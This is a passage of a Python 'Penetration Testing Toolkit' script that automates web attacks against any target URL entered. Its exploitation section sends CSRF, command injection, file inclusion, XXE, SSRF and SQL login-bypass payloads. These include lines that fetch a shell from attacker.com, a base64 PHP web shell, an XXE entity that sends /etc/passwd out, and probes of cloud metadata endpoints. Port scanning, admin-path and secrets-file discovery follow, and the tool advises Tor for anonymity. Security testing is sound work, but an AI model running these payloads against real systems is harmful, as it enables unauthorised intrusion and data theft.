                            logging.warning(f"[EXPLOITED] {attack_type} XSS at {test_url}")
                except requests.RequestException:
                    continue

        # 3. Advanced CSRF Exploitation
        print_section("CSRF Exploitation")
        print("Testing cross-site request forgery attack vectors...")
        
        csrf_endpoints = [
            "/user/profile/update",
            "/user/password/change",
            "/user/email/update",
            "/admin/settings/update",
            "/api/v1/user/update"
        ]
        
        csrf_data = {
            "email": "attacker@evil.com",
            "password": "hacked123",
            "role": "admin",
            "status": "active"
        }
        
        for endpoint in csrf_endpoints:
            try:
                full_url = urljoin(target, endpoint)
                response = requests.post(full_url, json=csrf_data, timeout=5)
                if response.status_code in [200, 201, 302]:
                    findings["CSRF"].append(f"Potential CSRF at: {full_url}")
                    print(f"[+] Potential CSRF vulnerability at: {full_url}")
                    logging.warning(f"[EXPLOITED] CSRF at {full_url}")
            except requests.RequestException:
                continue

        # 4. Command Injection Exploitation
        print_section("Command Injection Exploitation")
        print("Testing command injection attack vectors...")
        
        cmd_injection_payloads = {
            "Basic": [
                "; ls -la",
                "& dir",
                "| whoami",
                "`id`",
                "$(cat /etc/passwd)"
            ],
            "Advanced": [
                "$(sleep 5)",
                "|timeout 5",
                "& ping -c 5 127.0.0.1",
                ";nslookup attacker.com",
                "`wget http://attacker.com/shell.php`"
            ],
            "Filter Bypass": [
                "$(c'a't /etc/passwd)",
                "w'h'o'am'i",
                "p\"i\"n\"g -c 5 127.0.0.1",
                "$IFS/bin/bash$IFS-c$IFS'cat$/etc/passwd'"
            ]
        }
        
        test_params = ["cmd", "command", "exec", "ping", "query", "ip", "host"]
        
        for param in test_params:
            for attack_type, payloads in cmd_injection_payloads.items():
                for payload in payloads:
                    try:
                        test_url = f"{target}/{param}?{param}={urllib.parse.quote(payload)}"
                        response = requests.get(test_url, timeout=10)
                        if any(indicator in response.text.lower() for indicator in [
                            "root:", "uid=", "gid=", "groups=", "users", "drwxr",
                            "directory of", "volume", "/-", "/bin/", "/etc/"
                        ]):
                            findings["Command Injection"].append(f"Successful {attack_type} command injection at: {test_url}")
                            print(f"[+] Successful {attack_type} command injection at: {test_url}")
                            logging.warning(f"[EXPLOITED] {attack_type} command injection at {test_url}")
                    except requests.RequestException:
                        continue

        # 5. File Inclusion Exploitation
        print_section("File Inclusion Exploitation")
        print("Testing file inclusion attack vectors...")
        
        file_inclusion_payloads = {
            "LFI": [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "..%252f..%252f..%252fetc/passwd",
                "/proc/self/environ",
                "php://filter/convert.base64-encode/resource=index.php"
            ],
            "RFI": [
                "http://attacker.com/shell.txt",
                "https://pastebin.com/raw/shell.php",
                "ftp://attacker.com/shell.php",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
            ]
        }
        
        for attack_type, payloads in file_inclusion_payloads.items():
            for payload in payloads:
                try:
                    test_paths = [
                        f"{target}/include?file={urllib.parse.quote(payload)}",
                        f"{target}/load?page={urllib.parse.quote(payload)}",
                        f"{target}/content?path={urllib.parse.quote(payload)}",
                        f"{target}/template?file={urllib.parse.quote(payload)}"
                    ]
                    for test_url in test_paths:
                        response = requests.get(test_url, timeout=5)
                        if any(indicator in response.text for indicator in [
                            "root:x:", "HTTP_USER_AGENT", "<?php", "#!/bin/bash",
                            "[boot loader]", "[operating systems]"
                        ]):
                            findings["File Inclusion"].append(f"Successful {attack_type} at: {test_url}")
                            print(f"[+] Successful {attack_type} at: {test_url}")
                            logging.warning(f"[EXPLOITED] {attack_type} at {test_url}")
                except requests.RequestException:
                    continue

        # 6. XXE Exploitation
        print_section("XXE Exploitation")
        print("Testing XML external entity attack vectors...")
        
        xxe_payloads = {
            "Basic": '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>''',
            "Advanced": '''<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">%eval;%exfil;]><data>test</data>''',
            "OOB": '''<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><data>test</data>'''
        }
        
        xml_endpoints = ["/upload", "/import", "/api/xml", "/process", "/parse"]
        
        for endpoint in xml_endpoints:
            for attack_type, payload in xxe_payloads.items():
                try:
                    full_url = urljoin(target, endpoint)
                    headers = {'Content-Type': 'application/xml'}
                    response = requests.post(full_url, data=payload, headers=headers, timeout=5)
                    if any(indicator in response.text for indicator in [
                        "root:x:", "file://", "<!ENTITY", "<!DOCTYPE"
                    ]):
                        findings["XXE"].append(f"Successful {attack_type} XXE at: {full_url}")
                        print(f"[+] Successful {attack_type} XXE at: {full_url}")
                        logging.warning(f"[EXPLOITED] {attack_type} XXE at {full_url}")
                except requests.RequestException:
                    continue

        # 7. SSRF Exploitation
        print_section("SSRF Exploitation")
        print("Testing server-side request forgery attack vectors...")
        
        ssrf_payloads = {
            "Internal": [
                "http://localhost/admin",
                "http://127.0.0.1:80/",
                "http://[::1]/",
                "http://127.0.0.1:22",
                "http://127.0.0.1:3306"
            ],
            "Cloud": [
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/v1/"
            ],
            "Protocol": [
                "file:///etc/passwd",
                "dict://attacker:11111/",
                "gopher://127.0.0.1:25/",
                "ldap://127.0.0.1:389/%0astats%0aquit"
            ]
        }
        
        ssrf_params = ["url", "path", "proxy", "uri", "fetch", "site", "api"]
        
        for param in ssrf_params:
            for attack_type, payloads in ssrf_payloads.items():
                for payload in payloads:
                    try:
                        test_url = f"{target}/{param}?{param}={urllib.parse.quote(payload)}"
                        response = requests.get(test_url, timeout=5)
                        if any(indicator in response.text for indicator in [
                            "root:x:", "internal", "metadata", "ami-id",
                            "instance-id", "mysql", "smtp", "ldap"
                        ]):
                            findings["SSRF"].append(f"Successful {attack_type} SSRF at: {test_url}")
                            print(f"[+] Successful {attack_type} SSRF at: {test_url}")
                            logging.warning(f"[EXPLOITED] {attack_type} SSRF at {test_url}")
                    except requests.RequestException:
                        continue

        # 8. Authentication Bypass Exploitation
        print_section("Authentication Bypass Exploitation")
        print("Testing authentication bypass attack vectors...")
        
        auth_bypass_payloads = {
            "SQL": [
                "admin' --",
                "admin' #",
                "' OR '1'='1",
                "' OR 1=1 --",
                "') OR ('1'='1"
            ],
            "Logic": [
                "admin@test.com')",
                "admin@test.com' LIMIT 1 --",
                "admin' AND '1'='1",
                "admin@test.com' /*",
                "' OR 'x'='x"
            ]
        }
        
        auth_endpoints = ["/login", "/signin", "/auth", "/admin/login"]
        
        for endpoint in auth_endpoints:
            for attack_type, payloads in auth_bypass_payloads.items():
                for payload in payloads:
                    try:
                        full_url = urljoin(target, endpoint)
                        data = {
                            "username": payload,
                            "password": payload,
                            "email": f"{payload}@test.com"
                        }
                        response = requests.post(full_url, json=data, timeout=5)
                        if response.status_code in [200, 302] and any(indicator in response.text.lower() for indicator in [
                            "welcome", "dashboard", "profile", "admin", "success",
                            "logged in", "authenticated"
                        ]):
                            findings["Authentication Bypass"].append(f"Successful {attack_type} auth bypass at: {full_url}")
                            print(f"[+] Successful {attack_type} authentication bypass at: {full_url}")
                            logging.warning(f"[EXPLOITED] {attack_type} authentication bypass at {full_url}")
                    except requests.RequestException:
                        continue

        # Store results in database
        session = Session()
        try:
            for category, results in findings.items():
                if results:
                    for result in results:
                        exploit = Exploitation(
                            target=target,
                            exploit_name=category,
                            result=result
                        )
                        session.add(exploit)
            session.commit()
            logging.info("[INFO] Exploitation results stored in database")
        except Exception as db_error:
            session.rollback()
            logging.error(f"[ERROR] Database error: {str(db_error)}")
        finally:
            session.close()

    except Exception as e:
        logging.error(f"[ERROR] Exploitation failed: {str(e)}")
        raise

    print_section("Exploitation Summary")
    for category, results in findings.items():
        if results:
            print(f"\n{category} Findings:")
            for result in results:
                print(f"- {result}")

# Post-Exploitation
def post_exploitation(target):
    """
    Perform comprehensive post-exploitation analysis including port scanning,
    sensitive file detection, admin interface discovery, and privilege escalation checks.
    """
    logging.info("[INFO] Starting Post-Exploitation...")
    print_section("Post-Exploitation")
    
    try:
        # Validate target and check rate limit
        target = validate_input(target)
        parsed_url = urlparse(target)
        domain = parsed_url.netloc
        results = {
            'port_scan': [],
            'admin_interfaces': [],
            'sensitive_files': [],
            'privilege_escalation': []
        }
        
        # 1. Port Scanning
        try:
            ip = socket.gethostbyname(domain)
            logging.info(f"[INFO] Target IP: {ip}")
            
            common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 3389, 5432, 8080, 8443]
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((ip, port))
                    if result == 0:
                        results['port_scan'].append(port)
                        print_section("Port Scanning Results")
                        print(f"[+] Port {port} is open")
                    sock.close()
                except socket.error:
                    continue
                    
            if results['port_scan']:
                print_section("Port Scanning Results")
                print(f"[+] Open ports found: {', '.join(map(str, results['port_scan']))}")
        except socket.gaierror as e:
            logging.error(f"[ERROR] DNS resolution failed: {str(e)}")
        
        session = requests.Session()
        
        def make_request(url, phase_name):
            """Helper function to make requests with rate limiting and error handling"""
            try:
                time.sleep(2)  # Add 2-second delay between requests
                rate_limiter.check_rate_limit()
                response = session.get(url, timeout=10, allow_redirects=True, verify=False)
                return response
            except Exception as e:
                logging.warning(f"[WARNING] Rate limit hit during {phase_name}. Moving to next phase.")
                return None
        
        # 2. Admin Interface Discovery
        admin_paths = [
            '/admin', '/administrator', '/login', '/wp-admin',
            '/admin/login.php', '/admin/index.php', '/admin/dashboard',
            '/manager/html', '/phpmyadmin', '/cms', '/console'
        ]
        
        print_section("Admin Interface Discovery")
        print("Scanning for admin interfaces...")
        
        for path in admin_paths:
            full_url = urljoin(target, path)
            response = make_request(full_url, "admin interface discovery")
            if response and response.status_code in [200, 301, 302, 403]:
                results['admin_interfaces'].append(path)
                print_section("Admin Interface Discovery Results")
                print(f"[+] Potential admin interface: {full_url} (Status: {response.status_code})")
        
        # 3. Sensitive File Detection
        sensitive_files = [
            '/backup/', '/config/', '/database/', '/.env',
            '/wp-config.php', '/config.php', '/settings.php',
            '/robots.txt', '/.git/config', '/sitemap.xml',
            '/.htaccess', '/server-status', '/crossdomain.xml',
            '/phpinfo.php', '/info.php', '/.svn/entries',
            '/web.config', '/.well-known/'
        ]
        
        print_section("Sensitive File Detection")
        print("Scanning for sensitive files...")
        
        for file_path in sensitive_files:
            full_url = urljoin(target, file_path)
            response = make_request(full_url, "sensitive file detection")
            if response and response.status_code in [200, 403]:
                results['sensitive_files'].append(file_path)
                print_section("Sensitive File Detection Results")
                print(f"[+] Potential sensitive file: {full_url} (Status: {response.status_code})")
        
        # 4. Privilege Escalation Vectors
        priv_esc_paths = [
            '/user/profile', '/settings', '/account', '/profile',
            '/user/edit', '/admin/users', '/wp-admin/profile.php',
            '/dashboard/users', '/management/users', '/api/users',
            '/api/v1/users', '/api/admin', '/console/users'
        ]
        
        print_section("Privilege Escalation Check")
        print("Scanning for privilege escalation vectors...")
        
        for path in priv_esc_paths:
            full_url = urljoin(target, path)
            response = make_request(full_url, "privilege escalation check")
            if response and response.status_code in [200, 301, 302, 403]:
                results['privilege_escalation'].append(path)
                print_section("Privilege Escalation Check Results")
                print(f"[+] Potential privilege escalation vector: {full_url} (Status: {response.status_code})")
        
        # Store results in database
        session = Session()
        try:
            # Store all available results, even if some phases were incomplete
            for phase, findings in results.items():
                if findings:
                    post_exploit = PostExploitation(
                        target=target,
                        action_name=phase.replace('_', ' ').title(),
                        result=f"Found: {', '.join(map(str, findings))}"
                    )
                    session.add(post_exploit)
            
            session.commit()
            logging.info("[INFO] Post-exploitation results stored in database")
            
            # Log summary
            print_section("Post-Exploitation Summary")
            print(f"Open Ports: {len(results['port_scan'])}")
            print(f"Admin Interfaces: {len(results['admin_interfaces'])}")
            print(f"Sensitive Files: {len(results['sensitive_files'])}")
            print(f"Privilege Escalation Vectors: {len(results['privilege_escalation'])}")
            
        except Exception as db_error:
            session.rollback()
            logging.error(f"[ERROR] Database error: {str(db_error)}")
        finally:
            session.close()
            
    except Exception as e:
        logging.error(f"[ERROR] Post-exploitation failed: {str(e)}")
        # Don't raise the exception, just log it and continue
        
    return results  # Return results dictionary for potential further use

# Reporting
def report(target, sql_result="Vulnerable", xss_result="Not Vulnerable"):
    """
    Generate a report based on the provided target and results.
    """
    validate_input(target)
    logging.info("[INFO] Generating Report...")
    
    try:
        # Generate report data
        report_data = {
            'target': target,
            'scan_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'findings': []
        }
        
        # Fetch results from database
        session = Session()
        try:
            # Information Gathering Results
            info_results = session.query(InformationGathering).filter_by(target=target).all()
            if info_results:
                report_data['findings'].append({
                    'phase': 'Information Gathering',
                    'details': [{'ip': r.target_ip, 'headers': json.loads(r.http_header)} for r in info_results]
                })
            
            # Vulnerability Scan Results
            vuln_results = session.query(VulnerabilityScan).filter_by(target=target).all()
            if vuln_results:
                report_data['findings'].append({
                    'phase': 'Vulnerability Scanning',
                    'details': [{'vulnerability': r.vulnerability, 'result': r.result} for r in vuln_results]
                })
            
            # Post Exploitation Results
            post_results = session.query(PostExploitation).filter_by(target=target).all()
            if post_results:
                report_data['findings'].append({
                    'phase': 'Post Exploitation',
                    'details': [{'action': r.action_name, 'result': r.result} for r in post_results]
                })
        finally:
            session.close()
        
        # Generate filenames with timestamp
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        json_filename = f'report_{timestamp}.json'
        html_filename = f'report_{timestamp}.html'
        
        # Save JSON report
        json_report_path = os.path.join(REPORTS_DIR, json_filename)
        with open(json_report_path, 'w') as f:
            json.dump(report_data, f, indent=4)
        logging.info(f"[INFO] JSON Report saved to {json_report_path}")
        
        # Generate HTML report
        env = Environment(loader=FileSystemLoader(TEMPLATES_DIR))
        try:
            template = env.get_template('report_template.html')
            html_report = template.render(
                target=target,
                scan_date=report_data['scan_date'],
                findings=report_data['findings']
            )
            
            # Save HTML report
            html_report_path = os.path.join(REPORTS_DIR, html_filename)
            with open(html_report_path, 'w') as f:
                f.write(html_report)
            logging.info(f"[INFO] HTML Report saved to {html_report_path}")
            
            # Store report info in database
            session = Session()
            try:
                report_record = Report(
                    target=target,
                    html_report=html_report_path,
                    json_report=json_report_path
                )
                session.add(report_record)
                session.commit()
                logging.info("[INFO] Report details stored in database")
            except Exception as db_error:
                session.rollback()
                logging.error(f"[ERROR] Database error: {str(db_error)}")
            finally:
                session.close()
                
        except Exception as template_error:
            logging.error(f"[ERROR] HTML Report Generation Failed: {str(template_error)}")
            
    except Exception as e:
        logging.error(f"[ERROR] Report generation failed: {str(e)}")
        raise

def clear_database():
    """
    Clear all data from the database tables.
    This will remove all scan results, reports, and other stored information.
    """
    logging.info("[INFO] Clearing database...")
    try:
        session = Session()
        try:
            # Clear all tables
            session.query(InformationGathering).delete()
            session.query(VulnerabilityScan).delete()
            session.query(ManualTesting).delete()
            session.query(Exploitation).delete()
            session.query(PostExploitation).delete()
            session.query(Report).delete()
            
            session.commit()
            logging.info("[INFO] Database cleared successfully")
        except Exception as db_error:
            session.rollback()
            logging.error(f"[ERROR] Failed to clear database: {str(db_error)}")
            raise
        finally:
            session.close()
    except Exception as e:
        logging.error(f"[ERROR] Database operation failed: {str(e)}")
        raise

def display_demo_targets():
    """Display available demo targets with their descriptions."""
    print("\nAvailable Demo Targets:")
    print("-" * 56)
    print(f"{'Name':<15} {'URL':<35}")
    print("-" * 56)
    
    for name, info in DEMO_TARGETS.items():
        print(f"{name:<15} {info['url']:<35}")
    print("-" * 56)
    print("\nFeatures of Demo Targets:")
    for name, info in DEMO_TARGETS.items():
        print(f"\n{name.title()}:")
        print(f"- Features: {', '.join(info['features'])}")
        print(f"- Safe Paths: {', '.join(info['safe_paths'])}")

# Main menu
def main_menu():
    """Display the main menu and handle user input."""
    print("\n⚠️  SECURITY NOTICE ⚠️")
    print("This tool makes direct HTTP requests to target websites.")
    print("Your IP address and request details will be visible to the target.")
    print("For anonymity, use a VPN, proxy, or Tor network.")
    
    while True:
        print("\nPenetration Testing Toolkit\n")
        print("1. Information Gathering")
        print("2. Vulnerability Scanning")
        print("3. Manual Testing")
        print("4. Exploitation")
        print("5. Post-Exploitation")
        print("6. Generate Report")
        print("7. List Demo Targets")
        print("8. Clear Database")
        print("9. Exit")
        
        choice = input("\nEnter your choice: ")
        
        if choice == "1":
            target = input("Enter target website: ")
            information_gathering(target)
        elif choice == "2":
            target = input("Enter target website: ")
            vuln_scan(target)
        elif choice == "3":
            target = input("Enter target website: ")
            manual_test(target)
        elif choice == "4":
            target = input("Enter target website: ")
            exploit(target)
        elif choice == "5":
            target = input("Enter target website: ")
            post_exploitation(target)
        elif choice == "6":
            target = input("Enter target website: ")
            report(target)
        elif choice == "7":
            display_demo_targets()
        elif choice == "8":
            confirm = input("Are you sure you want to clear all database entries? This cannot be undone. (y/n): ")
            if confirm.lower() == 'y':
                clear_database()
                print("Database cleared successfully")
            else:
                print("Database clear cancelled")
        elif choice == "9":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

def parse_args():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description='Penetration Testing Toolkit - A comprehensive security testing suite')
    parser.add_argument('-t', '--target', help='Target URL or IP address')
    parser.add_argument('-m', '--mode', choices=['info', 'scan', 'manual', 'exploit', 'post', 'report', 'clear'],
                       help='Operation mode: info (Information Gathering), scan (Vulnerability Scan), '
                            'manual (Manual Testing), exploit (Exploitation), post (Post-Exploitation), '
                            'report (Generate Report), clear (Clear Database)')
    parser.add_argument('-d', '--demo', action='store_true',
                       help='List available demo targets')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose output')
    return parser.parse_args()

if __name__ == "__main__":
    try:
        args = parse_args()
        
        # Set logging level based on verbose flag
        if args.verbose:
            logging.getLogger().setLevel(logging.DEBUG)
        
        # Handle demo targets listing
        if args.demo:
            display_demo_targets()
            sys.exit(0)
        
        # If no arguments provided, run interactive menu
        if not args.mode and not args.target:
            main_menu()
            sys.exit(0)
        
        # Validate target if provided
        if args.mode and not args.target:
            print("Error: Target URL/IP is required when specifying a mode")
            sys.exit(1)
        
        # Execute specified mode
        if args.mode:
            target = args.target
            if not validate_input(target):
                print("Error: Invalid target URL/IP")
                sys.exit(1)
                
            modes = {
                'info': information_gathering,
                'scan': vuln_scan,
                'manual': manual_test,
                'exploit': exploit,
                'post': post_exploitation,
                'report': report,
                'clear': clear_database
            }
            
            if args.mode in modes:
                print(f"\nExecuting {args.mode} mode on target: {target}")
                modes[args.mode](target)
            else:
                print(f"Error: Unknown mode '{args.mode}'")
                sys.exit(1)
                
    except KeyboardInterrupt:
        print("\nOperation cancelled by user")
        sys.exit(0)
    except Exception as e:
        logging.error(f"An error occurred: {str(e)}")
        sys.exit(1)